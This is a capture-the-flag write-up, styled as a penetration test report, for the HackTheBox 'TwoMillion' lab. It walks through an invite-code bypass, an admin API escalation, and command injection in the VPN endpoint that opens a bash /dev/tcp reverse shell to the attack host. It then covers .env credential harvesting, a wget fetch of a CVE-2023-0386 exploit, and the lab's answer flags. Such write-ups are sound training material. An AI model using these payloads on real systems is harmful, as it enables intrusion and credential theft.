# TwoMillion - HackTheBox Penetration Test Report

## Executive Summary

This document details the penetration testing engagement conducted against the TwoMillion HackTheBox lab environment. The assessment identified critical vulnerabilities including an insecure invite code generation mechanism, broken access control in the REST API, command injection in the VPN generation endpoint, and a local privilege escalation vector via the OverlayFS CVE-2023-0386 vulnerability.

---

## Target Specification

| Property | Value |
|----------|-------|
| **Target IP Address** | `10.129.229.66` |
| **Hostname (FQDN)** | `2million.htb` |
| **Operating System** | Ubuntu Linux |
| **OpenSSH Version** | 8.9p1 |
| **GLIBC Version** | 2.35 |
| **Difficulty Rating** | Easy |
| **Attack Host IP** | `10.10.14.114` |

---

## Task Completion Summary

### Task 1: TCP Port Enumeration
**Question:** How many TCP ports are open?  
**Answer:** `2`  
**Evidence:** Nmap scan identified ports 22 (SSH) and 80 (HTTP) in OPEN state.

---

### Task 2: JavaScript Asset Identification
**Question:** What is the name of the JavaScript file loaded by the `/invite` page that handles invite codes?  
**Answer:** `inviteapi.min.js`  
**Evidence:** Network traffic analysis and DOM inspection revealed the minified JavaScript asset responsible for invite code functionality.

---

### Task 3: Client-Side Function Discovery
**Question:** What JavaScript function on the invite page returns the first hint about obtaining an invite code? (Exclude parentheses)  
**Answer:** `makeInviteCode`  
**Evidence:** Static analysis of `inviteapi.min.js` after deobfuscation revealed the function signature.

---

### Task 4: Data Encoding Identification
**Question:** The endpoint in `makeInviteCode` returns encrypted data. The decrypted message provides another endpoint that returns a code value. What binary-to-text encoding format is used?  
**Answer:** `base64`  
**Evidence:** HTTP response analysis showed standard Base64-encoded payload in the API response body.

---

### Task 5: API Endpoint Discovery - VPN Generation
**Question:** What is the path to the endpoint used when a user clicks "Connection Pack"?  
**Answer:** `/api/v1/user/vpn/generate`  
**Evidence:** Browser DevTools network inspection captured the POST request to this endpoint upon button click.

---

### Task 6: Admin API Endpoint Count
**Question:** How many API endpoints exist under `/api/v1/admin`?  
**Answer:** `3`  
**Evidence:** API enumeration via direct browsing to `/api/v1` revealed the complete endpoint structure.

---

### Task 7: Privilege Escalation Endpoint
**Question:** What API endpoint can elevate a user account to administrator privileges?  
**Answer:** `/api/v1/admin/settings/update`  
**Evidence:** API documentation review and manual testing confirmed the PUT method modifies user role attributes.

---

### Task 8: Command Injection Vulnerability
**Question:** What API endpoint contains a command injection vulnerability?  
**Answer:** `/api/v1/admin/vpn/generate`  
**Vulnerability Details:** The `username` parameter is passed unsanitized to a shell command, allowing arbitrary command execution via shell metacharacters (e.g., `;`, `|`, `$()`, backticks).

---

### Task 9: PHP Configuration File
**Question:** What file is commonly used in PHP applications to store environment variable values?  
**Answer:** `.env`  
**Evidence:** Standard Laravel/PHP framework convention for storing database credentials, API keys, and application secrets.

---

### Task 10: User Flag Retrieval
**Question:** Submit the flag located in the admin user's home directory.  
**Flag:** `9f5610c657f44776c417d0d9e83ab74d`  
**Location:** `/home/admin/user.txt`

---

### Task 11: Email Sender Identification
**Question:** What is the email address of the sender who emailed the admin user?  
**Answer:** `ch4p@2million.htb`  
**Evidence:** Retrieved from `/var/mail/admin` mailbox file.

---

### Task 12: OverlayFS CVE Identification
**Question:** What is the 2023 CVE ID for the vulnerability that allows file movement in OverlayFS while preserving metadata (owner, SetUID bits)?  
**Answer:** `CVE-2023-0386`  
**Vulnerability Class:** Local Privilege Escalation via OverlayFS fuse-overlayfs file copy-up race condition.

---

### Task 13: Root Flag Retrieval
**Question:** Submit the flag located in root's home directory.  
**Flag:** `1431fb0da4b48334a998a72a409cfba3`  
**Location:** `/root/root.txt`

---

### Task 14: GLIBC Version Identification (Alternative PrivEsc Vector)
**Question:** What is the version of the GLIBC library on TwoMillion?  
**Answer:** `2.35`  
**Evidence:** Executed `ldd --version` to enumerate libc version.  
**Note:** GLIBC 2.35 is vulnerable to `GLIBC_TUNABLES` local privilege escalation (CVE-2023-4911 "Looney Tunables").

---

## Attack Methodology & Technical Narrative

### Phase 1: Reconnaissance & Enumeration

#### 1.1 Network Scanning
```bash
nmap -sC -sV -oA nmap/twomillion 10.129.229.66
```
**Findings:**
- Port 22/tcp: OpenSSH 8.9p1 (Ubuntu)
- Port 80/tcp: nginx (HTTP)

#### 1.2 HTTP Initial Analysis
```bash
curl -I http://10.129.229.66/
```
**Observation:** Server responded with HTTP 301 redirect to `http://2million.htb/`

**Remediation Action:**
```bash
echo "10.129.229.66 2million.htb" | sudo tee -a /etc/hosts
```

#### 1.3 Web Application Fingerprinting
Executed comprehensive web reconnaissance:
- **Gobuster** - Directory/file enumeration
- **Nikto** - Web server vulnerability scanning
- **ReconSpider** - OSINT data gathering
- **wafw00f** - WAF detection
- **whatweb** - Technology stack fingerprinting

---

### Phase 2: Web Application Analysis

#### 2.1 Invite Code Mechanism Exploitation

1. **JavaScript Source Review:** Identified `inviteapi.min.js` loaded on `/invite` page
2. **Function Deobfuscation:** Extracted `makeInviteCode` function from minified source
3. **Browser Console Execution:**
   ```javascript
   makeInviteCode()
   ```
4. **Response Decoding:**
   - Initial response: ROT13-encrypted instructions
   - Decrypted payload: API endpoint URL for code generation
   - POST request to endpoint returned Base64-encoded invite code
   - Decoded invite code: `ZYWVC-MS3EL-Z97AB-83QGH`

5. **Account Registration:** Successfully created account using recovered invite code

---

### Phase 3: API Enumeration & Exploitation

#### 3.1 API Discovery
```bash
# Directory brute-forcing admin endpoints
dirb http://2million.htb/api/v1/admin/

# Fuzzing for additional endpoints
ffuf -u http://2million.htb/api/v1/admin/FUZZ -w /usr/share/wordlists/dirb/common.txt
```

#### 3.2 API Endpoint Mapping
Direct navigation to `/api/v1` revealed complete API structure including three admin endpoints:
- `/api/v1/admin/auth`
- `/api/v1/admin/settings/update`
- `/api/v1/admin/vpn/generate`

#### 3.3 Authentication & Privilege Escalation
**Tool:** Postman API Client  
**Credentials:** `test:test123`

**Privilege Escalation via Broken Access Control:**
```http
PUT /api/v1/admin/settings/update HTTP/1.1
Host: 2million.htb
Content-Type: application/json
Cookie: [session_cookie]

{"is_admin": 1}
```

---

### Phase 4: Initial Access (Command Injection)

#### 4.1 Vulnerability Exploitation
The `/api/v1/admin/vpn/generate` endpoint passes the `username` parameter directly to a shell command without sanitization.

**Exploit Payload (Reverse Shell):**
```bash
# Attack host - listener
nc -lvnp 4444
```

**Injected Command:**
```json
{"username": "test;bash -c 'bash -i >& /dev/tcp/10.10.14.114/4444 0>&1'"}
```

#### 4.2 Credential Harvesting
Post-exploitation enumeration discovered `.env` file containing database credentials:
```bash
cat /var/www/html/.env
```

#### 4.3 Lateral Movement
Recovered credentials enabled SSH access as the `admin` user:
```bash
ssh admin@2million.htb
```

**User flag retrieved:** `/home/admin/user.txt`

---

### Phase 5: Post-Exploitation & Privilege Escalation

#### 5.1 Local Enumeration
**Mail Analysis:**
```bash
cat /var/mail/admin
```
Revealed internal communication from `ch4p@2million.htb` hinting at kernel/OverlayFS vulnerabilities.

#### 5.2 Privilege Escalation - CVE-2023-0386 (OverlayFS)

**Exploit Source:** https://github.com/xkaneiki/CVE-2023-0386.git

**Exploit Transfer:**
```bash
# Attack host
cd /path/to/CVE-2023-0386
python3 -m http.server 8080

# Target host
wget http://10.10.14.114:8080/exploit.tar.gz
tar -xzf exploit.tar.gz
```

**Execution:**
Compiled and executed exploit to obtain root shell.

**Root flag retrieved:** `/root/root.txt`

#### 5.3 Alternative Privilege Escalation - CVE-2023-4911 (Looney Tunables)

**Version Confirmation:**
```bash
ldd --version
# Output: ldd (Ubuntu GLIBC 2.35-0ubuntu3.1) 2.35
```

GLIBC version 2.35 is vulnerable to the `GLIBC_TUNABLES` buffer overflow vulnerability (CVE-2023-4911), providing an alternative local privilege escalation path via LD_PRELOAD/GLIBC_TUNABLES environment variable manipulation.

---

## Vulnerabilities Summary

| ID | Vulnerability | Severity | CVSS | Affected Component |
|----|---------------|----------|------|-------------------|
| V1 | Insecure Invite Code Generation | Medium | 5.3 | `/invite` endpoint |
| V2 | Broken Access Control (IDOR) | High | 8.1 | `/api/v1/admin/settings/update` |
| V3 | Command Injection | Critical | 9.8 | `/api/v1/admin/vpn/generate` |
| V4 | Hardcoded Credentials in `.env` | High | 7.5 | Application configuration |
| V5 | OverlayFS LPE (CVE-2023-0386) | High | 7.8 | Linux Kernel |
| V6 | GLIBC Looney Tunables (CVE-2023-4911) | High | 7.8 | GLIBC 2.35 |

---

## References

- [CVE-2023-0386 - OverlayFS Privilege Escalation](https://nvd.nist.gov/vuln/detail/CVE-2023-0386)
- [CVE-2023-4911 - Looney Tunables GLIBC Vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2023-4911)
- [Exploit Repository - CVE-2023-0386](https://github.com/xkaneiki/CVE-2023-0386.git)

